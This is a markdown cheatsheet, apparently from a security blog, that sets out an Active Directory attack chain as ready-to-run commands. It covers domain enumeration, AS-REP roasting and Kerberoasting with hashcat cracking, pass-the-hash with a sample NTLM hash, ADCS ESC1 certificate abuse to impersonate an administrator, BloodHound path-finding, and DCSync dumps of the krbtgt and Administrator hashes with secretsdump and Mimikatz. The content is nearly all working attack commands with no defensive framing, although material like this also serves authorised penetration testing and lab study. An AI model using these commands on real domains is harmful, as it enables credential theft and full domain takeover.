---
title: "Active Directory Exploitation & Attacks Cheatsheet"
description: "Comprehensive Active Directory reconnaissance, Kerberoasting, AS-REP roasting, ADCS escalation, and DCSync guide."
pubDate: "2024-04-15"
category: "Cheatsheet"
tags: ["active-directory", "kerberos", "adcs", "dcsync", "kerberoasting", "bloodhound"]
---

# Active Directory Exploitation

## 1. Domain Enumeration & Reconnaissance
```bash
# Using NetExec / CrackMapExec
netexec smb 10.10.10.100 -u 'guest' -p '' --shares
netexec smb 10.10.10.100 -u 'user' -p 'password' --users
netexec smb 10.10.10.100 -u 'user' -p 'password' --pass-pol

# Using LDAPSearch
ldapsearch -x -H ldap://10.10.10.100 -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName

# Using PowerView (from Windows host)
Get-DomainUser | Select-Object samaccountname, description
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainController
Get-DomainTrust
```

## 2. Kerberos Attacks

### A. AS-REP Roasting (No Pre-Authentication Required)
```bash
# Remote Attack via Impacket
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -dc-ip 10.10.10.100

# Crack with Hashcat
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### B. Kerberoasting (Service Principal Names)
```bash
# Request TGS tickets using valid domain credentials
impacket-GetUserSPNs domain.local/username:password -dc-ip 10.10.10.100 -request

# Output to hash file and crack:
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

### C. Pass-the-Ticket & Pass-the-Hash
```bash
# Pass-the-Hash using NetExec or Impacket
netexec smb 10.10.10.100 -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:fc525c9680e4760202ff6109f1c019e4'

# Pass-the-Hash with Impacket wmiexec
impacket-wmiexec -hashes :fc525c9680e4760202ff6109f1c019e4 Administrator@10.10.10.100
```

## 3. Active Directory Certificate Services (ADCS)

### Finding Vulnerable Certificate Templates
```bash
# Enumerate ADCS with Certipy
certipy find -u 'username@domain.local' -p 'password' -dc-ip 10.10.10.100 -vulnerable

# ESC1 Exploitation (Client Authentication + Enrollee Supplies Subject)
certipy req -u 'username@domain.local' -p 'password' -ca 'CA-NAME' -template 'VulnerableTemplate' -upn 'administrator@domain.local' -dc-ip 10.10.10.100

# Authenticate with generated administrator.pfx
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.100
```

## 4. BloodHound Enumeration
```bash
# Run BloodHound Python Ingestor
bloodhound-python -u 'username' -p 'password' -d domain.local -ns 10.10.10.100 -c All

# Common BloodHound Cypher Queries:
# Find shortest path to Domain Admins:
MATCH (m:User {name:"USER@DOMAIN.LOCAL"}), (n:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}), p=shortestPath((m)-[r*1..]->(n)) RETURN p
```

## 5. Domain Controller Dumping & DCSync
```bash
# DCSync using Impacket secretsdump
impacket-secretsdump domain.local/Administrator:Password@10.10.10.100

# Using Mimikatz on Domain Controller
privilege::debug
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /user:Administrator
```
